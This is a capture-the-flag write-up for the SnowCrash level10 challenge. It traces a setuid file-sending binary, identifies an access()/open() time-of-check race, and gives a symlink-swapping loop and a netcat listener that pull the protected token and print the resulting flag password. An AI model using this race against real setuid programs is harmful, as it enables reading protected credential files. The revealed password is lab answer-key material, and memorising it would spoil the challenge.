# Start / RE

```sh
level10@SnowCrash:~$ ls -la
[...]
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
>> token can't be read, level10 have effective user: flag10

```sh
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```
>> request2 args:file to send and ip to send to

```sh
level10@SnowCrash:~$ ./level10 /tmp/test
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ltrace ./level10 /tmp/test
__libc_start_main(0x80486d4, 2, 0xbffff7e4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
)          = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
>> exit if 1 arg

```sh
level10@SnowCrash:~$ strace ./level10 /tmp/test
execve("./level10", ["./level10", "/tmp/test"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "./level10 file host\n\tsends file "..., 65./level10 file host
	sends file to host if you have access to it
) = 65
exit_group(1)                           = ?
```
>> open, read the file  


```sh
level10@SnowCrash:~$ ifconfig
eth3      Link encap:Ethernet  HWaddr 08:00:27:25:03:2f  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
```
>> have our ip address

```sh
level10@SnowCrash:~$ ./level10 /tmp/file 10.0.2.15
Connecting to 10.0.2.15:6969 .. Connected!
Sending file .. wrote file!
```
>> send the file to ourself while listening on 10.0.2.15:6969 on another ssh instance

```sh
level10@SnowCrash:~$ nc -l 10.0.2.15 6969
.*( )*.
[content of file]
```
>> listen to 10.0.2.15:6969 and receive the file sent

```sh
level10@SnowCrash:~$ ./level10 token 10.0.2.15
You don't have access to token
```
>> level10 don't have the right to read token neither

### ltrace when working
```sh
level10@SnowCrash:~$ ltrace ./level10 /tmp/file 10.0.2.15
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/file", 4)                                                                = 0
printf("Connecting to %s:6969 .. ", "10.0.2.15")                                      = 32
fflush(0xb7fd1a20Connecting to 10.0.2.15:6969 .. )                                                                    = 0
socket(2, 1, 0)                                                                       = 3
inet_addr("10.0.2.15")                                                                = 0x0f02000a
htons(6969, 1, 0, 0, 0)                                                               = 14619
connect(3, 0xbffff71c, 16, 0, 0)                                                      = 0
write(3, ".*( )*.\n", 8)                                                              = 8
printf("Connected!\nSending file .. "Connected!
)                                                = 27
fflush(0xb7fd1a20Sending file .. )                                                                    = 0
open("/tmp/file", 0, 010)                                                             = 4
read(4, "[content of file]\n", 4096)                                                  = 18
write(3, "[content of file]\n", 18)                                                   = 18
puts("wrote file!"wrote file!
)                                                                   = 12
+++ exited (status 12) +++
```

### ltrace when not working
```sh
level10@SnowCrash:~$ ltrace ./level10 token 10.0.2.15
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                                    = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)                                      = 31
+++ exited (status 31) +++
```

### strace when working
```sh
level10@SnowCrash:~$ strace ./level10 /tmp/file 10.0.2.15
execve("./level10", ["./level10", "/tmp/file", "10.0.2.15"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
access("/tmp/file", R_OK)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "Connecting to 10.0.2.15:6969 .. ", 32Connecting to 10.0.2.15:6969 .. ) = 32
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("10.0.2.15")}, 16) = 0
write(3, ".*( )*.\n", 8)                = 8
write(1, "Connected!\n", 11Connected!
)            = 11
write(1, "Sending file .. ", 16Sending file .. )        = 16
open("/tmp/file", O_RDONLY)             = 4
read(4, "[content of file]\n", 4096)    = 18
write(3, "[content of file]\n", 18)     = 18
write(1, "wrote file!\n", 12wrote file!
)           = 12
exit_group(12)                          = ?
```

### strace when not working
```sh
level10@SnowCrash:~$ strace ./level10 token 10.0.2.15
execve("./level10", ["./level10", "token", "10.0.2.15"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
access("token", R_OK)                   = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "You don't have access to token\n", 31You don't have access to token
) = 31
exit_group(31)                          = ?
```

# Report

There is a call of acces, it check if the real user have the right to read the file pass un argument, but the call open check only the right of th effective user

# Exploit

we create a script to alterne the file pass in argument between token and a file that we can read

```sh
touch /tmp/force
while :
do
  ln -sf ~/token /tmp/token
  ln -sf /tmp/force /tmp/token
done
```


`while true; do ./level10 /tmp/token 10.0.2.15 ; done;`

we do an infinite loop to exec level while the script running

```sh
level10@SnowCrash:~$ nc -lk 10.0.2.15 6969
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
```
>> woupa2yuojeeaaed06riuj63c if the password of flag10